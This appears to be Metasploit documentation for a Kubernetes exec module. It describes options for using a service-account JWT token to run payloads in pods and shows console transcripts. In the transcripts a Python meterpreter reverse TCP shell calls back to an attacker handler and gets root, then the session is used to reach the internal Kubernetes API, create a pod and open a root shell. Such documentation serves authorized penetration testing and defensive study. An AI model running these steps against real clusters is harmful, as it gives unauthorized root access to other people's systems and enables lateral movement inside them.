## Vulnerable Application

### Description

Execute a payload within a Kubernetes pod.

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/multi/kubernetes/exec`
3. Set the required options
4. Do: `run`
5. You should get a shell.

## Options

### SESSION
An optional session to use for configuration. When specified, the values of `NAMESPACE`, `TOKEN`, `RHOSTS` and `RPORT`
will be gathered from the session host. This requires that the session be on an existing Kubernetes pod. The necessary
values may not always be present.

Setting this option will also automatically route connections through the specified session.

### TOKEN
The JWT token. The token with the necessary privileges to access the exec endpoint within a running pod and optionally
create a new pod.

### POD
The pod name to execute in. When not specified, a new pod will be created with an entrypoint that allows it to run
forever. After creation, the pod will be used to execute the payload. **The created pod is not automatically cleaned
up.** A note containing the created pod's information will be added to the database when it is connected.

### NAMESPACE
The Kubernetes namespace that the `TOKEN` has permissions for and that `POD` either exists in or should be created in.

### SHELL
The shell to use for execution. `bash` is likely preferred from a usability perspective, but is not present as often as
`sh` is.

### PodName
*This is an advanced option.*

The image from which to create the pod. When a new pod is created (`POD` is blank), this option can be used to specify
the image that is used. If this option is blank, each image will be tried from the list of running pods until one
successfully starts.

### TARGET
#### Interactive WebSocket
Communicate directly with the pod using the Kubernetes WebSocket API. This is the most similar option to the `kubectl
exec --stdin --tty` command. No Metasploit payload is transferred to the target.

### Unix Command
Run the specified command payload and read the output. Custom commands can be run with the `cmd/unix/generic` payload.

### Linux Dropper
Use a command stager to transfer a Metasploit payload to the target and execute it. This will result in the payload
being written to disk and will require potentially non-standard binaries to be present on the remote system, depending
on the selected `CMDSTAGER::FLAVOR` option.

### Python
Run a Python payload on the remote host. This technique will automatically find and use either a `python`, `python3`, or
`python2` binary on the remote system to use for execution.

## Scenarios

### Kubernetes v1.22.1
In this scenario, Metasploit has direct access to the Kubernetes API. A known token is used to execute a Python payload
within the `thinkphp-67f7c88cc9-tgpfh` pod.

```
msf6 > use exploit/multi/kubernetes/exec 
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/kubernetes/exec) > set TOKEN eyJhbGciOiJSUzI1...
TOKEN => eyJhbGciOiJSUzI1...
msf6 exploit(multi/kubernetes/exec) > set POD thinkphp-67f7c88cc9-tgpfh
POD => thinkphp-67f7c88cc9-tgpfh
msf6 exploit(multi/kubernetes/exec) > set RHOSTS 192.168.159.31
RHOSTS => 192.168.159.31
msf6 exploit(multi/kubernetes/exec) > set TARGET Python 
TARGET => Python
msf6 exploit(multi/kubernetes/exec) > set PAYLOAD python/meterpreter/reverse_tcp
PAYLOAD => python/meterpreter/reverse_tcp
msf6 exploit(multi/kubernetes/exec) > run

[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] Sending stage (39736 bytes) to 192.168.159.31
[*] Meterpreter session 1 opened (192.168.159.128:4444 -> 192.168.159.31:59234) at 2021-10-01 09:55:00 -0400

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : thinkphp-67f7c88cc9-tgpfh
OS           : Linux 5.4.0-88-generic #99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021
Architecture : x64
Meterpreter  : python/linux
meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/kubernetes/exec) >
```

Next, the compromised session is used to access the internal Kubernetes endpoint, create a new pod and open a shell
directly via a WebSocket.

```
msf6 exploit(multi/kubernetes/exec) > set TARGET Interactive\ WebSocket
TARGET => Interactive WebSocket
msf6 exploit(multi/kubernetes/exec) > run RHOST="" RPORT="" POD="" SESSION=-1

[*] Routing traffic through session: 1
[+] Kubernetes service host: 10.96.0.1:443
[*] Using image: busybox
[+] Pod created: burhgvzc
[*] Waiting for the pod to be ready...
[+] Successfully established the WebSocket
[*] Found shell.
[*] Command shell session 2 opened (172.17.0.31:59437 -> 10.96.0.1:443) at 2021-10-01 10:05:57 -0400

id
uid=0(root) gid=0(root) groups=10(wheel)
pwd
/
```
